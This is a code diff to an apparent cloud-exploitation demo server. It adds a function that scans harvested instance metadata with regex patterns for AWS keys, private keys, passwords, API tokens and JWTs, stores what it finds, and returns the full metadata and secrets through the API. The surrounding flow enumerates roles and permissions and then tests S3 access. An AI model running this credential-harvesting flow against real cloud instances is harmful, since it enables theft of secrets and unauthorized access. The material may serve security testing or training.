@@ -36,6 +36,8 @@ let currentSession = {
   token: null,
   roles: [],
   permissions: null,
+  metadata: {},
+  metadataSecrets: [],
 };
 
 // Helper function to emit logs to UI
@@ -46,6 +48,61 @@ function emitLog(type, message, data = null) {
   if (data) {
     console.log(`[${timestamp}] [DATA]`, JSON.stringify(data, null, 2));
   }
+}
+
+// Scan metadata for credentials and secrets
+function scanMetadataForSecrets(metadata) {
+  const secrets = [];
+
+  for (const [path, value] of Object.entries(metadata)) {
+    const text = `${path} ${value}`;
+    const findings = [];
+
+    // AWS Access Key pattern: AKIA[0-9A-Z]{16}
+    if (/AKIA[0-9A-Z]{16}/.test(text)) {
+      findings.push('AWS Access Key');
+    }
+
+    // AWS Secret Key pattern (40 chars base64-like)
+    if (/(?:^|[^A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?:[^A-Za-z0-9/+=]|$)/.test(text)) {
+      findings.push('Potential AWS Secret Key');
+    }
+
+    // Private keys
+    if (/-----BEGIN.*PRIVATE KEY-----/.test(text)) {
+      findings.push('Private Key');
+    }
+
+    // Password-related fields
+    if (/(password|passwd|pwd|secret)[:=]/i.test(text)) {
+      findings.push('Password field');
+    }
+
+    // API tokens
+    if (/(api[_-]?key|apikey|token|bearer)[:=]/i.test(text)) {
+      findings.push('API Token/Key');
+    }
+
+    // URLs with credentials (http://user:pass@host)
+    if (/https?:\/\/[^:]+:[^@]+@/.test(text)) {
+      findings.push('URL with credentials');
+    }
+
+    // JWT tokens
+    if (/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(text)) {
+      findings.push('JWT Token');
+    }
+
+    if (findings.length > 0) {
+      secrets.push({
+        path,
+        value,
+        types: findings
+      });
+    }
+  }
+
+  return secrets;
 }
 
 // Start exploitation flow
@@ -196,6 +253,21 @@ app.post('/api/start', async (req, res) => {
     const metadataCount = Object.keys(metadata).length;
     emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
     emitLog('info', 'Metadata includes: instance-id, instance-type, placement, tags, user-data, etc.');
+
+    // Store metadata in session
+    currentSession.metadata = metadata;
+
+    // Scan metadata for secrets/credentials
+    emitLog('info', 'Scanning metadata for secrets and credentials...');
+    const metadataSecrets = scanMetadataForSecrets(metadata);
+    currentSession.metadataSecrets = metadataSecrets;
+    if (metadataSecrets.length > 0) {
+      emitLog('warning', `⚠ Found ${metadataSecrets.length} potential secrets/credentials in metadata`);
+      emitLog('info', `Secret types: ${[...new Set(metadataSecrets.flatMap(s => s.types))].join(', ')}`);
+    } else {
+      emitLog('info', 'No obvious secrets found in metadata');
+    }
+
     currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });
 
     // Step 6: Enumerate permissions
@@ -219,6 +291,8 @@ app.post('/api/start', async (req, res) => {
       roles: currentSession.roles,
       permissions: permResults,
       metadata: metadataCount,
+      metadataDetails: metadata,
+      metadataSecrets: metadataSecrets,
     });
 
     // Step 7: Test S3 access
